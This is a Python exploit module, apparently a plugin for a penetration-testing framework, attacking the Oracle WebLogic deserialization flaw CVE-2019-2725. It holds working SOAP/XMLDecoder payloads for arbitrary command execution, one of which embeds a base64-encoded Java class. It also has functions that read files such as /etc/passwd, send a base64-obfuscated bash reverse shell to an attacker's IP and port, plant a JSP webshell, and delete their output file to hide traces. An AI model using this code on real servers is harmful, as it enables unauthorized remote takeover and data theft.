#!/usr/bin/env python3

import time
from app.lib.utils.request import request
from app.lib.utils.encode import base64encode
from app.lib.utils.common import get_capta, get_useragent

class CVE_2019_2725_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-2725',
            'description': 'Weblogic Deserialize Vulnerability, Weblogic 10.3.6.0.0 and 12.1.3.0.0',
            'date': '2019-04-26',
            'type': 'Deserialize',
            'exptype': 'check,cmd,read,reverse,webshell'
        }
        self.url = url
        self.osname = 'Unknown'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'text/xml;charset=UTF-8',
        }
        
        self.linux_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
            <soapenv:Header> 
                <wsa:Action>log</wsa:Action>
                <wsa:RelatesTo>log</wsa:RelatesTo>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"> 
                    <void class="java.lang.ProcessBuilder"> 
                    <array class="java.lang.String" length="3"> 
                        <void index="0"> 
                        <string>/bin/bash</string> 
                        </void>  
                        <void index="1"> 
                        <string>-c</string> 
                        </void>  
                        <void index="2"> 
                        <string>{cmd}</string>
                        </void> 
                    </array>  
                    <void method="start"/>
                    </void> 
                </java>    </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
                <asy:onAsyncDelivery/>
            </soapenv:Body>
            </soapenv:Envelope>       
        '''
        self.windows_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
            <soapenv:Header> 
                <wsa:Action>log</wsa:Action>
                <wsa:RelatesTo>log</wsa:RelatesTo>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"> 
                    <void class="java.lang.ProcessBuilder"> 
                    <array class="java.lang.String" length="3"> 
                        <void index="0"> 
                        <string>cmd.exe</string> 
                        </void>  
                        <void index="1"> 
                        <string>/c</string> 
                        </void>  
                        <void index="2"> 
                        <string>{cmd}</string> 
                        </void> 
                    </array>  
                    <void method="start"/>
                    </void> 
                </java>    </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
                <asy:onAsyncDelivery/>
            </soapenv:Body>
            </soapenv:Envelope>       
        '''
    
    def weblogic_10_3_6(self, cmd):
        
        '''
        执行weblogic 10.3.6的payload

        :param str: cmd: 要执行的命令
        
        :return str result or False
        '''
        
        try:
            linux_req = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = cmd))
            windows_req = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.windows_payload.format(cmd = cmd))
            time.sleep(2)
            check_req = request.get(self.url + '/_async/access.log', headers = self.headers)
            if linux_req.status_code == 202 and check_req.status_code == 200:
                return True, check_req.text
            if windows_req.status_code == 202 and check_req.status_code == 200:
                return True, check_req.text
            return False
        except Exception as e:
            return False
        finally:
            pass
        
    def weblogic_12_1_3(self, cmd):
        
        '''
        执行weblogic 12.1.3的payload,此payload并不支持所有的命令,使用cat /etc/passwd命令就会失败,使用ls -la就可以

        :param str: cmd: 要执行的命令
        
        :return str result or False
        '''
        
        payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
            <java>
            <class><string>org.slf4j.ext.EventData</string>
            <void>
            <string>
                    <java>
                        <void class="sun.misc.BASE64Decoder">
                            <void method="decodeBuffer" id="byte_arr">	<string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string>
                            </void>
                        </void>
                        <void class="org.mozilla.classfile.DefiningClassLoader">
                            <void method="defineClass">
                                <string>ResultBaseExec</string>
                                <object idref="byte_arr"></object>
                                <void method="newInstance">
                                    <void method="do_exec" id="result">
                                        <string>%s</string>
                                    </void>
                                </void>
                            </void>
                        </void>
                        <void class="java.lang.Thread" method="currentThread">
                            <void method="getCurrentWork" id="current_work">
                                <void method="getClass">
                                    <void method="getDeclaredField">
                                        <string>connectionHandler</string>
                                            <void method="setAccessible"><boolean>true</boolean></void>
                                        <void method="get">
                                            <object idref="current_work"></object>
                                            <void method="getServletRequest">
                                                <void method="getResponse">
                                                    <void method="getServletOutputStream">
                                                        <void method="writeStream">
                                                            <object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object>
                                                            </void>
                                                        <void method="flush"/>
                                                        </void>
                                                <void method="getWriter"><void method="write"><string></string></void></void>
                                                </void>
                                            </void>
                                        </void>
                                    </void>
                                </void>
                            </void>
                        </void>
                    </java>
            </string>
            </void>
            </class>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
        '''%(cmd)
        try:
            req = request.post(self.url + '/wls-wsat/CoordinatorPortType', headers = self.headers, data = payload)
            if req.status_code == 200:
                return True, req.text
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass

    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return tuple True,payload or False
        """
        
        check_payload =  'echo %swin^dowslin$1ux' %(self.capta)
        weblogic_10_3_6_check = self.weblogic_10_3_6(check_payload + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
        if weblogic_10_3_6_check:
            if 'linux' in weblogic_10_3_6_check[1] and self.capta in weblogic_10_3_6_check[1]:
                self.osname = 'Linux'
                return True, 'weblogic_10_3_6', 'Linux'
            if 'windows' in weblogic_10_3_6_check[1] and self.capta in weblogic_10_3_6_check[1]:
                self.osname = 'Windows'
                return True, 'weblogic_10_3_6', 'Windows'
        weblogic_12_1_3_check = self.weblogic_12_1_3('echo %swin^dowslin$1ux' %(self.capta))
        if weblogic_12_1_3_check:
            if self.capta in weblogic_12_1_3_check[1] and ('windows' in weblogic_12_1_3_check[1] or 'linux' in weblogic_12_1_3_check[1]):
                if 'linux' in weblogic_12_1_3_check[1]:
                    self.osname = 'linux'
                    return True, 'weblogic_12_1_3', 'Linux'
                elif 'windows' in weblogic_12_1_3_check[1]:
                    self.osname = 'windows'
                    return True, 'weblogic_12_1_3', 'Windows'
        return False

    def cmd(self, cmd):
    
        """
        执行命令

        :param str cmd: 要执行的命令

        :return tuple result: 执行的结果
        """

        try:
            check_result = self.check()
            if check_result:
                if check_result[1] == 'weblogic_10_3_6':
                    cmd_result = self.weblogic_10_3_6(cmd + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
                    if check_result[2] == 'Linux':
                        delete = self.weblogic_10_3_6('rm -f' + ' ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
                    else:
                        delete = self.weblogic_10_3_6('del /q' + r' .\servers/AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war/access.log')
                    return cmd_result[1]
                else:
                    cmd_result = self.weblogic_12_1_3(cmd)
                    return True, cmd_result[1]
            else:
                return False, '不存在CVE-2019-2725漏洞'
        except Exception as e:
            return False, e
        finally:
            pass
    
    def read(self, filename):
    
        """
        读取文件内容

        :param str filename: 要读取的文件名字.

        :return tuple result: 文件内容
        """
        
        try:
            check_result = self.check()
            if check_result:
                if check_result[1] == 'weblogic_10_3_6':
                    readfile_result = self.weblogic_10_3_6('cat ' + filename + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
                    if check_result[2] == 'Linux':
                        delete = self.weblogic_10_3_6('rm -f' + ' ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
                    else:
                        delete = self.weblogic_10_3_6('del /q' + r' .\servers/AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war/access.log')
                    return True, readfile_result[1]
                else:
                    return False, '存在CVE-2019-2725漏洞,但读取文件失败,请尝试cmd利用方式'
            else:
                return False, '不存在CVE-2019-2725漏洞'
        except Exception as e:
            return False, e
        finally:
            pass
    
    def reverse(self, ip, port):
    
        """
        反弹shell

        :param str ip: 要反弹的ip地址
        :param str port: 要反弹的端口

        :return tuple result: 反弹结果
        """
        
        try:
            check_result = self.check()
            if check_result:
                reverse_command = "bash -i >& /dev/tcp/{ip}/{port} 0>&1 &".format(ip = ip, port = port)
                reverse_command = "{echo,%s}|{base64,-d}|{bash,-i}" % (base64encode(reverse_command))
                if check_result[1] == 'weblogic_10_3_6':
                    if check_result[2] == 'Linux':
                        reverse_result = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = reverse_command))
                    else:
                        return False, '存在漏洞,但插件CVE-2019-2725暂不支持Windows系统反弹shell,请尝试cmd利用方式'
                    return True, '反弹会话命令已发送,可到会话管理模块查看是否有会话反弹'
                else:
                    return False, '存在CVE-2019-2725漏洞,但利用失败,请尝试cmd利用方式'
            else:
                return False, '不存在CVE-2019-2725漏洞'
        except Exception as e:
            return False, e
        finally:
            pass
    
    def webshell(self, filename):
    
        """
        写入shell文件

        :param str filename: 写入的shell文件名字
    
        :return tuple result: 写入结果
        """
        try:
            check_result = self.check()
            if check_result:
                with open('app/static/cmd_jsp.jsp', 'r', encoding = 'utf-8') as reader:
                    jsp_data = reader.read()
                if check_result[1] == 'weblogic_10_3_6':
                    if check_result[2] == 'Linux':
                        webshell_result = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = 'echo "%s" | base64 -d | tee ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/%s.jsp' %(base64encode(jsp_data), filename)))
                        check_shell_req = request.get(self.url + '/_async/%s.jsp' % (filename))
                        if check_shell_req.status_code == 200:
                            return True, self.url + '/_async/%s.jsp' % (filename)
                    else:
                        return False, '存在漏洞,但上传webshell失败, 请尝试cmd利用方式'
                else:
                    return False, '存在CVE-2019-2725漏洞,但上传shell文件失败,请尝试cmd利用方式'
            else:
                return False, '不存在CVE-2019-2725漏洞'
        except Exception as e:
            return False, e
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_2725 = CVE_2019_2725_BaseVerify('http://127.0.0.1:7001')
    print(CVE_2019_2725.cmd('whoami'))
    print(CVE_2019_2725.read('/etc/passwd'))


